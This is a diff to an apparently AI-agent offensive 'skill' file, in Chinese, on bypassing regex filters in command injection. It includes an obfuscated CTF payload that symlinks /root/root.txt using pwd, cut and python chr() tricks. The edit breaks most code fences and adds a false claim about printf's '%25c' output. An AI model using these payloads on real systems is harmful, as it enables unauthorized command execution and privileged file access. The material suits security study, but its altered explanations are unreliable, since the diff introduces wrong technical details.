@@ -4,7 +4,7 @@ description: '命令注入正则绕过模式：$(...) 无条件执行、python c
 disable-model-invocation: true
 metadata: { domain: web, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
 
 # 命令注入正则绕过技术
 
@@ -12,9 +12,9 @@ metadata: { domain: web, tier: T3 }
 
 ## 模式 1：执行操作符选择
 
-```
+```text
 注入前：systemctl status --no-pager {USER_INPUT}
-```
+```text
 
 | 操作符 | 行为 | 陷阱 |
 |--------|------|------|
@@ -37,15 +37,15 @@ metadata: { domain: web, tier: T3 }
 
 **场景**：命令通过 HTTP POST form data 传递
 
-```
+```yaml
 发送: data={"service": "$(printf '%c' 46)"}
       ↓ URL 编码
 实际: service=%24%28printf+%27%25c%27+46%29
       ↓ 服务器解码
 执行: $(printf '%c' 46)  ← 注意：%c 变成了 %25c！
       ↓ 
-输出: "4" (不是 ".")
-```
+输出: 24 个空格 + '.'（printf 把 %25 解析为宽度 25，而非单个 '.'）
+```text
 
 **根因**：`%` 被 URL 编码为 `%25`，`printf` 收到的是 `%25c` 而非 `%c`。
 
@@ -71,7 +71,7 @@ metadata: { domain: web, tier: T3 }
 
 ## DevArea 实战案例
 
-```
+```yaml
 正则: ^[^;/\\&.<>\\rA-Z]*$
 注入: systemctl status --no-pager {INPUT}
 目标: ln -sf /root/root.txt /opt/syswatch/logs/service_log
@@ -80,14 +80,14 @@ Payload:
 $(ln -sf $(pwd|cut -c1)root$(pwd|cut -c1)root$(python3 -c "print(chr(46))")txt $(pwd|cut -c1)opt$(pwd|cut -c1)syswatch$(pwd|cut -c1)logs$(pwd|cut -c1)service_log)
 
 展开后: ln -sf /root/root.txt /opt/syswatch/logs/service_log
-```
+```text
 
 ## 检验清单
 
-```
+```text
 [ ] 测试目标命令失败时 exit code 是什么？（决定 || 还是 && 还是 $(...)）
 [ ] 逐个字符检查 payload 是否被正则拦截
 [ ] 如果是 HTTP 传输，% 会被编码为 %25
 [ ] 目标有 python3/perl/awk 哪个可用？
 [ ] 需要生成特殊字符时，优先用 chr() 而非 printf/echo
-```
+```text
